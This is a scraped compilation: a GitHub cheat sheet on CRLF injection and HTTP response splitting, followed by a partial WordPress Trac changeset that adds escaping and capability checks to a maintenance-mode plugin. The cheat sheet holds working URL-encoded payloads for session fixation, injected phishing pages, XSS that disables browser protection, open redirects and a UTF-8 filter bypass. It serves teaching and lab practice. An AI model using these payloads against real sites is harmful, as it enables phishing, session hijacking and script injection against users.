> CRLF Injection is a web security vulnerability that arises when an attacker injects unexpected Carriage Return (CR) (\r) and Line Feed (LF) (\n) characters into an application. These characters are used to signify the end of a line and the start of a new one in network protocols like HTTP, SMTP, and others. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.

## Summary

* [Methodology](#methodology)
  + [Session Fixation](#session-fixation)
  + [Cross Site Scripting](#cross-site-scripting)
  + [Open Redirect](#open-redirect)
* [Filter Bypass](#filter-bypass)
* [Labs](#labs)
* [References](#references)

## Methodology

HTTP Response Splitting is a security vulnerability where an attacker manipulates an HTTP response by injecting Carriage Return (CR) and Line Feed (LF) characters (collectively called CRLF) into a response header. These characters mark the end of a header and the start of a new line in HTTP responses.

**CRLF Characters**:

* `CR` (`\r`, ASCII 13): Moves the cursor to the beginning of the line.
* `LF` (`\n`, ASCII 10): Moves the cursor to the next line.

By injecting a CRLF sequence, the attacker can break the response into two parts, effectively controlling the structure of the HTTP response. This can result in various security issues, such as:

* Cross-Site Scripting (XSS): Injecting malicious scripts into the second response.
* Cache Poisoning: Forcing incorrect content to be stored in caches.
* Header Manipulation: Altering headers to mislead users or systems

### Session Fixation

A typical HTTP response header looks like this:

```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123
```

If user input `value\r\nSet-Cookie: admin=true` is embedded into the headers without sanitization:

```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=value
Set-Cookie: admin=true
```

Now the attacker has set their own cookie.

### Cross Site Scripting

Beside the session fixation that requires a very insecure way of handling user session, the easiest way to exploit a CRLF injection is to write a new body for the page. It can be used to create a phishing page or to trigger an arbitrary Javascript code (XSS).

**Requested page**

```
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

**HTTP response**

```
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```

In the case of an XSS, the CRLF injection allows to inject the `X-XSS-Protection` header with the value value "0", to disable it. And then we can add our HTML tag containing Javascript code .

**Requested page**

```
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

**HTTP Response**

```
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

### Open Redirect

Inject a `Location` header to force a redirect for the user.

```
%0d%0aLocation:%20http://myweb.com
```

## Filter Bypass

[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) states that most HTTP header field values use only a subset of the US-ASCII charset.

> Newly defined header fields SHOULD limit their field values to US-ASCII octets.

Firefox followed the spec by stripping off any out-of-range characters when setting cookies instead of encoding them.

| UTF-8 Character | Hex | Unicode | Stripped |
| --- | --- | --- | --- |
| `嘊` | `%E5%98%8A` | `\u560a` | `%0A` (\n) |
| `嘍` | `%E5%98%8D` | `\u560d` | `%0D` (\r) |
| `嘾` | `%E5%98%BE` | `\u563e` | `%3E` (>) |
| `嘼` | `%E5%98%BC` | `\u563c` | `%3C` (<) |

The UTF-8 character `嘊` contains `0a` in the last part of its hex format, which would be converted as `\n` by Firefox.

An example payload using UTF-8 characters would be:

```
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
```

URL encoded version

```
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
```

## Labs

* [PortSwigger - HTTP/2 request splitting via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
* [Root Me - CRLF](https://www.root-me.org/en/Challenges/Web-Server/CRLF)

## References

* [CRLF Injection - CWE-93 - OWASP - May 20, 2022](https://www.owasp.org/index.php/CRLF_Injection)
* [CRLF injection on Twitter or why blacklists fail - XSS Jigsaw - April 21, 2015](https://web.archive.org/web/20150425024348/https%3A//blog.innerht.ml/twitter-crlf-injection/)
* [Starbucks: [newscdn.starbucks.com] CRLF Injection, XSS - Bobrov - December 20, 2016](https://vulners.com/hackerone/H1%3A192749)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from plugins.trac.wordpress.org_190e985e_20250111_113436.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F3099123)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Changeset](/changeset/3099122 "Changeset 3099122")
* [Next Changeset](/changeset/3099124 "Changeset 3099124") →

---

# Changeset 3099123

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
06/07/2024 07:37:32 AM
([7 months](/timeline?from=2024-06-07T07%3A37%3A32Z&precision=second "See timeline at 06/07/2024 07:37:32 AM") ago)

Author:
WebFactory
Message:

Security fixes

Location:
[minimal-coming-soon-maintenance-mode/trunk](/browser/minimal-coming-soon-maintenance-mode/trunk?rev=3099123)
Files:

13 edited

* [framework/admin/include/classes/class-mailchimp.php](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/include/classes/class-mailchimp.php?rev=3099123 "Show entry in browser")
  (modified)
  ([1 diff](#file0 "Show differences"))
* [framework/admin/init.php](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/init.php?rev=3099123 "Show entry in browser")
  (modified)
  ([2 diffs](#file1 "Show differences"))
* [framework/admin/views/settings-advanced.php](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-advanced.php?rev=3099123 "Show entry in browser")
  (modified)
  ([1 diff](#file2 "Show differences"))
* [framework/admin/views/settings-email.php](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-email.php?rev=3099123 "Show entry in browser")
  (modified)
  ([2 diffs](#file3 "Show differences"))
* [framework/admin/views/settings-form.php](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-form.php?rev=3099123 "Show entry in browser")
  (modified)
  ([2 diffs](#file4 "Show differences"))
* [framework/admin/views/settings-pro.php](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-pro.php?rev=3099123 "Show entry in browser")
  (modified)
  ([1 diff](#file5 "Show differences"))
* [framework/admin/views/settings-seo.php](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-seo.php?rev=3099123 "Show entry in browser")
  (modified)
  ([2 diffs](#file6 "Show differences"))
* [framework/init.php](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/init.php?rev=3099123 "Show entry in browser")
  (modified)
  ([2 diffs](#file7 "Show differences"))
* [framework/public/init.php](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/public/init.php?rev=3099123 "Show entry in browser")
  (modified)
  ([1 diff](#file8 "Show differences"))
* [framework/public/views/html.php](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/public/views/html.php?rev=3099123 "Show entry in browser")
  (modified)
  ([1 diff](#file9 "Show differences"))
* [framework/wf-licensing.php](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=3099123 "Show entry in browser")
  (modified)
  ([3 diffs](#file10 "Show differences"))
* [minimal-coming-soon-maintenance-mode.php](/browser/minimal-coming-soon-maintenance-mode/trunk/minimal-coming-soon-maintenance-mode.php?rev=3099123 "Show entry in browser")
  (modified)
  ([1 diff](#file11 "Show differences"))
* [readme.txt](/browser/minimal-coming-soon-maintenance-mode/trunk/readme.txt?rev=3099123 "Show entry in browser")
  (modified)
  ([3 diffs](#file12 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [minimal-coming-soon-maintenance-mode/trunk/framework/admin/include/classes/class-mailchimp.php](/changeset/3099123/minimal-coming-soon-maintenance-mode/trunk/framework/admin/include/classes/class-mailchimp.php "Show the changeset 3099123 restricted to minimal-coming-soon-maintenance-mode/trunk/framework/admin/include/classes/class-mailchimp.php")

  | [r2455515](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/include/classes/class-mailchimp.php?rev=2455515#L33 "Show revision 2455515 of this file in browser") | [r3099123](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/include/classes/class-mailchimp.php?rev=3099123#L33 "Show revision 3099123 of this file in browser") |  |
  | --- | --- | --- |
  | 33 | 33 | if ($api\_endpoint === null) { |
  | 34 | 34 | if (strpos($this->api\_key, '-') === false) { |
  | 35 |  | throw new \Exception("Invalid MailChimp API key ~~`{$api\_key}`~~ supplied."); |
  |  | 35 | throw new \Exception("Invalid MailChimp API key supplied."); |
  | 36 | 36 | } |
  | 37 | 37 | list(, $data\_center) = explode('-', $this->api\_key); |
* ## [minimal-coming-soon-maintenance-mode/trunk/framework/admin/init.php](/changeset/3099123/minimal-coming-soon-maintenance-mode/trunk/framework/admin/init.php "Show the changeset 3099123 restricted to minimal-coming-soon-maintenance-mode/trunk/framework/admin/init.php")

  | [r3031149](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/init.php?rev=3031149#L15 "Show revision 3031149 of this file in browser") | [r3099123](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/init.php?rev=3099123#L15 "Show revision 3099123 of this file in browser") |  |
  | --- | --- | --- |
  | 15 | 15 | function csmm\_add\_menu() |
  | 16 | 16 | { |
  | 17 |  | if (current\_user\_can('~~administrator~~')) { |
  |  | 17 | if (current\_user\_can('manage\_options')) { |
  | 18 | 18 | // Adding to the plugin panel link to the settings menu |
  | 19 | 19 | $signals\_csmm\_menu = add\_options\_page( |
  | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/init.php?rev=3031149#L241) | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/init.php?rev=3099123#L241) |  |
  | 241 | 241 | function csmm\_activate\_theme() |
  | 242 | 242 | { |
  | 243 |  | if (!current\_user\_can('~~administrator~~')) { |
  |  | 243 | if (!current\_user\_can('manage\_options')) { |
  | 244 | 244 | wp\_die('You don\'t have privileges to run this action.'); |
  | 245 | 245 | } |
* ## [minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-advanced.php](/changeset/3099123/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-advanced.php "Show the changeset 3099123 restricted to minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-advanced.php")

  | [r2821146](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-advanced.php?rev=2821146#L61 "Show revision 2821146 of this file in browser") | [r3099123](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-advanced.php?rev=3099123#L61 "Show revision 3099123 of this file in browser") |  |
  | --- | --- | --- |
  | 61 | 61 | <textarea name="signals\_csmm\_html" id="signals\_csmm\_html" rows="8" placeholder="<?php esc\_attr\_e( 'Custom HTML for the plugin', 'minimal-coming-soon-maintenance-mode' ); ?>"><?php echo esc\_textarea(stripslashes( $signals\_csmm\_options['custom\_html'] )); ?></textarea> |
  | 62 | 62 |  |
  | 63 |  | <p class="signals-form-help-block"><?php echo ~~\_\_( 'Custom HTML for the plugin goes over here. Please note that ', 'minimal-coming-soon-maintenance-mode' ) . '<i style="color: #f96773">' . \_\_( '[html], [head], [title], [meta], [body], and similar tags', 'minimal-coming-soon-maintenance-mode' ) . '</i>' .~~ \_\_( ' are not required. Only provide content HTML for the page.', 'minimal-coming-soon-maintenance-mode' ); ?></p> |
  |  | 63 | <p class="signals-form-help-block"><?php echo esc\_html\_\_( 'Custom HTML for the plugin goes over here. Please note that ', 'minimal-coming-soon-maintenance-mode' ) . '<i style="color: #f96773">' . esc\_html\_\_( '[html], [head], [title], [meta], [body], and similar tags', 'minimal-coming-soon-maintenance-mode' ) . '</i>' . esc\_html\_\_( ' are not required. Only provide content HTML for the page.', 'minimal-coming-soon-maintenance-mode' ); ?></p> |
  | 64 | 64 | <p class="signals-form-help-block"><?php esc\_attr\_e( 'To insert subscription form anywhere in the HTML, simply use the placeholder <strong>{{form}}</strong> and you are done. This should only be used if you have enabled the above option to use custom HTML only.', 'minimal-coming-soon-maintenance-mode' ); ?></p> |
  | 65 | 65 | </div> |
* ## [minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-email.php](/changeset/3099123/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-email.php "Show the changeset 3099123 restricted to minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-email.php")

  | [r2821146](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-email.php?rev=2821146#L73 "Show revision 2821146 of this file in browser") | [r3099123](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-email.php?rev=3099123#L73 "Show revision 3099123 of this file in browser") |  |
  | --- | --- | --- |
  | 73 | 73 |  |
  | 74 | 74 | if ( ! $signals\_lists ) { |
  | 75 |  | echo '<p class="signals-form-help-block">' . \_\_( '<b>Error</b> fetching mailing lists. Please make sure that the API key you entered is correct and try again.', 'minimal-coming-soon-maintenance-mode' ) . '</p>'; |
  |  | 75 | echo '<p class="signals-form-help-block">' . esc\_html\_\_( '<b>Error</b> fetching mailing lists. Please make sure that the API key you entered is correct and try again.', 'minimal-coming-soon-maintenance-mode' ) . '</p>'; |
  | 76 | 76 | } else if ( count($signals\_lists) == 0 ) { |
  | 77 |  | echo '<p class="signals-form-help-block">' . \_\_( 'It seems that there is no list created for this account. Create one on the MailChimp website and then try again.', 'minimal-coming-soon-maintenance-mode' ) . '</p>'; |
  |  | 77 | echo '<p class="signals-form-help-block">' . esc\_html\_\_( 'It seems that there is no list created for this account. Create one on the MailChimp website and then try again.', 'minimal-coming-soon-maintenance-mode' ) . '</p>'; |
  | 78 | 78 | } else { |
  | 79 | 79 | echo '<select name="signals\_csmm\_list" id="signals\_csmm\_list">'; |
  | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-email.php?rev=2821146#L84) | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-email.php?rev=3099123#L84) |  |
  | 84 | 84 |  |
  | 85 | 85 | echo '</select>'; |
  | 86 |  | echo '<p class="signals-form-help-block">' . \_\_( 'Select the MailChimp list in which you want to store the subscriber data.', 'minimal-coming-soon-maintenance-mode' ) . '</p>'; |
  |  | 86 | echo '<p class="signals-form-help-block">' . esc\_html\_\_( 'Select the MailChimp list in which you want to store the subscriber data.', 'minimal-coming-soon-maintenance-mode' ) . '</p>'; |
  | 87 | 87 | } |
  | 88 | 88 | } else { |
  | 89 |  | echo '<p class="signals-form-help-block">' . \_\_( 'Enter your MailChimp API key in the field above and click "Save API key". Your lists will refresh and appear here.', 'minimal-coming-soon-maintenance-mode' ) . '</p>'; |
  |  | 89 | echo '<p class="signals-form-help-block">' . esc\_html\_\_( 'Enter your MailChimp API key in the field above and click "Save API key". Your lists will refresh and appear here.', 'minimal-coming-soon-maintenance-mode' ) . '</p>'; |
  | 90 | 90 | } |
  | 91 | 91 |  |
* ## [minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-form.php](/changeset/3099123/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-form.php "Show the changeset 3099123 restricted to minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-form.php")

  | [r2821146](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-form.php?rev=2821146#L79 "Show revision 2821146 of this file in browser") | [r3099123](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-form.php?rev=3099123#L79 "Show revision 3099123 of this file in browser") |  |
  | --- | --- | --- |
  | 79 | 79 | // Loading font sizes with the help of a loop |
  | 80 | 80 | for ( $i = 11; $i < 41; $i++ ) { |
  | 81 |  | echo '<option value="' . esc\_attr($i) . '"' . selected( $signals\_csmm\_options['input\_font\_size'], $i ) . '>' . esc\_attr($i) . \_\_( 'px', 'minimal-coming-soon-maintenance-mode' ) . '</option>'; |
  |  | 81 | echo '<option value="' . esc\_attr($i) . '"' . selected( $signals\_csmm\_options['input\_font\_size'], $i ) . '>' . esc\_attr($i) . esc\_html\_\_( 'px', 'minimal-coming-soon-maintenance-mode' ) . '</option>'; |
  | 82 | 82 | } |
  | 83 | 83 |  |
  | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-form.php?rev=2821146#L96) | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-form.php?rev=3099123#L96) |  |
  | 96 | 96 | // Loading font sizes with the help of a loop |
  | 97 | 97 | for ( $i = 11; $i < 41; $i++ ) { |
  | 98 |  | echo '<option value="' . esc\_attr($i) . '"' . selected( $signals\_csmm\_options['button\_font\_size'], $i ) . '>' . esc\_attr($i) . \_\_( 'px', 'minimal-coming-soon-maintenance-mode' ) . '</option>'; |
  |  | 98 | echo '<option value="' . esc\_attr($i) . '"' . selected( $signals\_csmm\_options['button\_font\_size'], $i ) . '>' . esc\_attr($i) . esc\_html\_\_( 'px', 'minimal-coming-soon-maintenance-mode' ) . '</option>'; |
  | 99 | 99 | } |
  | 100 | 100 |  |
* ## [minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-pro.php](/changeset/3099123/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-pro.php "Show the changeset 3099123 restricted to minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-pro.php")

  | [r2821146](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-pro.php?rev=2821146#L246 "Show revision 2821146 of this file in browser") | [r3099123](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-pro.php?rev=3099123#L246 "Show revision 3099123 of this file in browser") |  |
  | --- | --- | --- |
  | 246 | 246 | echo '<ol>'; |
  | 247 | 247 | echo '<li><a href="https://dashboard.comingsoonwp.com/pro-download/" target="\_blank">Download</a> the latest version of the PRO plugin or grab it from the purchase confirmation email we sent you.</li>'; |
  | 248 |  | echo '<li>Go to <a href="' . ~~admin\_url('plugin-install.php'~~) . '">Plugins - Add New - Upload Plugin</a> and upload the ZIP you just downloaded.</li>'; |
  |  | 248 | echo '<li>Go to <a href="' . esc\_url(admin\_url('plugin-install.php')) . '">Plugins - Add New - Upload Plugin</a> and upload the ZIP you just downloaded.</li>'; |
  | 249 | 249 | echo '<li>If asked to replace (overwrite) the free version - confirm it.</li>'; |
  | 250 | 250 | echo '<li>Activate the plugin.</li>'; |
* ## [minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-seo.php](/changeset/3099123/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-seo.php "Show the changeset 3099123 restricted to minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-seo.php")

  | [r2136383](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-seo.php?rev=2136383#L16 "Show revision 2136383 of this file in browser") | [r3099123](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-seo.php?rev=3099123#L16 "Show revision 3099123 of this file in browser") |  |
  | --- | --- | --- |
  | 16 | 16 | <div class="signals-form-group"> |
  | 17 | 17 | <label for="signals\_csmm\_title" class="signals-strong">SEO Title</label> |
  | 18 |  | <input type="text" name="signals\_csmm\_title" id="signals\_csmm\_title" data-site-title="<?php echo ~~get\_bloginfo('name'); ?>" value="<?php echo esc\_attr\_e~~( stripslashes( $signals\_csmm\_options['title'] ) ); ?>" placeholder="%sitetitle% is coming soon" class="signals-form-control"> |
  |  | 18 | <input type="text" name="signals\_csmm\_title" id="signals\_csmm\_title" data-site-title="<?php echo esc\_html(get\_bloginfo('name')); ?>" value="<?php echo esc\_html\_\_( stripslashes( $signals\_csmm\_options['title'] ) ); ?>" placeholder="%sitetitle% is coming soon" class="signals-form-control"> |
  | 19 | 19 | <div class="mm-seo-progress " id="mm-seo-progress-title"><div class="mm-seo-progress-bar"></div></div> |
  | 20 | 20 | <p class="signals-form-help-block">Recommended format: <i>Primary Keyword - Secondary Keyword - Brand Name</i> with length up to 60 characters.</p> |
  | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-seo.php?rev=2136383#L23) | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/admin/views/settings-seo.php?rev=3099123#L23) |  |
  | 23 | 23 | <div class="signals-form-group"> |
  | 24 | 24 | <label for="signals\_csmm\_description" class="signals-strong">Meta Description</label> |
  | 25 |  | <textarea type="text" name="signals\_csmm\_description" id="signals\_csmm\_description" data-site-description="<?php echo ~~get\_bloginfo('description'); ?>" rows="3" class="signals-form-control"><?php echo esc\_attr\_e~~( stripslashes( $signals\_csmm\_options['description'] ) ); ?></textarea> |
  |  | 25 | <textarea type="text" name="signals\_csmm\_description" id="signals\_csmm\_description" data-site-description="<?php echo esc\_html(get\_bloginfo('description')); ?>" rows="3" class="signals-form-control"><?php echo esc\_html\_\_( stripslashes( $signals\_csmm\_options['description'] ) ); ?></textarea> |
  | 26 | 26 | <div class="mm-seo-progress " id="mm-seo-progress-description"><div class="mm-seo-progress-bar"></div></div> |
  | 27 | 27 | <p class="signals-form-help-block">Write for humans, not search engines! This text will incite people to click on your site on Google. Length should be 50 - 300 characters.</p> |
* ## [minimal-coming-soon-maintenance-mode/trunk/framework/init.php](/changeset/3099123/minimal-coming-soon-maintenance-mode/trunk/framework/init.php "Show the changeset 3099123 restricted to minimal-coming-soon-maintenance-mode/trunk/framework/init.php")

  | [r3031149](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/init.php?rev=3031149#L24 "Show revision 3031149 of this file in browser") | [r3099123](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/init.php?rev=3099123#L24 "Show revision 3099123 of this file in browser") |  |
  | --- | --- | --- |
  | 24 | 24 |  |
  | 25 | 25 | // admin bar has to be anabled, user an admin and custom filter true |
  | 26 |  | if ($options['disable\_adminbar'] || false === is\_admin\_bar\_showing() || false === current\_user\_can('~~administrator~~') || false === apply\_filters('csmm\_show\_admin\_bar', true)) { |
  |  | 26 | if ($options['disable\_adminbar'] || false === is\_admin\_bar\_showing() || false === current\_user\_can('manage\_options') || false === apply\_filters('csmm\_show\_admin\_bar', true)) { |
  | 27 | 27 | return; |
  | 28 | 28 | } |
  | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/init.php?rev=3031149#L45) | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/init.php?rev=3099123#L45) |  |
  | 45 | 45 |  |
  | 46 | 46 | // only show to admins |
  | 47 |  | if ($options['disable\_adminbar'] || false === current\_user\_can('~~administrator~~') || false === apply\_filters('csmm\_show\_admin\_bar', true)) { |
  |  | 47 | if ($options['disable\_adminbar'] || false === current\_user\_can('manage\_options') || false === apply\_filters('csmm\_show\_admin\_bar', true)) { |
  | 48 | 48 | return; |
  | 49 | 49 | } |
* ## [minimal-coming-soon-maintenance-mode/trunk/framework/public/init.php](/changeset/3099123/minimal-coming-soon-maintenance-mode/trunk/framework/public/init.php "Show the changeset 3099123 restricted to minimal-coming-soon-maintenance-mode/trunk/framework/public/init.php")

  | [r3031149](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/public/init.php?rev=3031149#L49 "Show revision 3031149 of this file in browser") | [r3099123](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/public/init.php?rev=3099123#L49 "Show revision 3099123 of this file in browser") |  |
  | --- | --- | --- |
  | 49 | 49 | } |
  | 50 | 50 |  |
  | 51 |  | if(isset($\_GET['preview\_coming\_soon']) && current\_user\_can('~~administrator~~')){ |
  |  | 51 | if(isset($\_GET['preview\_coming\_soon']) && current\_user\_can('manage\_options')){ |
  | 52 | 52 | csmm\_render\_template( $signals\_csmm\_options ); |
  | 53 | 53 | } |
* ## [minimal-coming-soon-maintenance-mode/trunk/framework/public/views/html.php](/changeset/3099123/minimal-coming-soon-maintenance-mode/trunk/framework/public/views/html.php "Show the changeset 3099123 restricted to minimal-coming-soon-maintenance-mode/trunk/framework/public/views/html.php")

  | [r2966554](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/public/views/html.php?rev=2966554#L185 "Show revision 2966554 of this file in browser") | [r3099123](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/public/views/html.php?rev=3099123#L185 "Show revision 3099123 of this file in browser") |  |
  | --- | --- | --- |
  | 185 | 185 | if (is\_user\_logged\_in()) { |
  | 186 | 186 | echo '<div id="login-button" class="loggedin">'; |
  | 187 |  | echo '<a title="' . ~~\_\_('Open WordPress admin', 'minimal-coming-soon-maintenance-mode') . '" href="' . esc\_url(get\_site\_url()) . '/wp-admin/"><img src="' . esc\_url(CSMM\_URL) . '/framework/public/img/wp-logo-white.png" alt="' . \_\_('Open WordPress admin', 'minimal-coming-soon-maintenance-mode') . '" title="' .~~ \_\_('Open WordPress admin', 'minimal-coming-soon-maintenance-mode') . '"></a>'; |
  |  | 187 | echo '<a title="' . esc\_html\_\_('Open WordPress admin', 'minimal-coming-soon-maintenance-mode') . '" href="' . esc\_url(get\_site\_url()) . '/wp-admin/"><img src="' . esc\_url(CSMM\_URL) . '/framework/public/img/wp-logo-white.png" alt="' . esc\_html\_\_('Open WordPress admin', 'minimal-coming-soon-maintenance-mode') . '" title="' . esc\_html\_\_('Open WordPress admin', 'minimal-coming-soon-maintenance-mode') . '"></a>'; |
  | 188 | 188 | } else { |
  | 189 | 189 | echo '<div id="login-button" class="loggedout">'; |
  | 190 |  | echo '<a title="' . ~~\_\_('Log in to WordPress admin', 'minimal-coming-soon-maintenance-mode') . '" href="' . esc\_url(get\_site\_url()) . '/wp-login.php"><img src="' . esc\_url(CSMM\_URL) . '/framework/public/img/wp-logo-white.png" alt="' . \_\_('Log in to WordPress admin', 'minimal-coming-soon-maintenance-mode') . '" title="' .~~ \_\_('Log in to WordPress admin', 'minimal-coming-soon-maintenance-mode') . '"></a>'; |
  |  | 190 | echo '<a title="' . esc\_html\_\_('Log in to WordPress admin', 'minimal-coming-soon-maintenance-mode') . '" href="' . esc\_url(get\_site\_url()) . '/wp-login.php"><img src="' . esc\_url(CSMM\_URL) . '/framework/public/img/wp-logo-white.png" alt="' . esc\_html\_\_('Log in to WordPress admin', 'minimal-coming-soon-maintenance-mode') . '" title="' . esc\_html\_\_('Log in to WordPress admin', 'minimal-coming-soon-maintenance-mode') . '"></a>'; |
  | 191 | 191 | } |
  | 192 | 192 | echo '</div>'; |
* ## [minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php](/changeset/3099123/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php "Show the changeset 3099123 restricted to minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php")

  | [r3031149](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=3031149#L563 "Show revision 3031149 of this file in browser") | [r3099123](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=3099123#L563 "Show revision 3099123 of this file in browser") |  |
  | --- | --- | --- |
